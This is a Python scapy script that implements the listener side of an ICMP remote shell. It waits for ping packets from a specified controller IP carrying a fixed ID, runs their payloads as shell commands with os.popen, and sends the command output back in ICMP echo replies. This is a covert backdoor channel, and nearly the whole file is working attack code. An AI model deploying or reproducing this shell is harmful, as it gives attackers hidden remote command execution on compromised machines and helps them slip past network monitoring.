from scapy.all import sr,IP,ICMP,Raw,sniff 
import argparse
import os

IDCMP = 13170 
ttl = 64

def icmpshell(packet):
    if packet[IP].src == args.destination_ip and packet[ICMP].type == 8 and packet[ICMP].id == IDCMP and packet[Raw].load:
        icmppaket = (packet[Raw].load).decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()
        icmppacket = (IP(dst=args.destination_ip, ttl=ttl)/ICMP(type=0, id=IDCMP)/Raw(load=payload))
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

if __name__ == "__main__":
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print('[!] Please install the python3 scapy module')
        print('[!] use the command pip3 install scapy')
        exit()
        
    #fake parses user args
    parser = argparse.ArgumentParser()
    parser.add_argument('-i' '--interface', type=str, required=True, help="Listener (virtual) Network Interface eth0")
    parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP adress")
    args = parser.parse_args()

    print('[+] ICMP listener started')
    sniff(prn=icmpshell, filter='icmp', store='0')
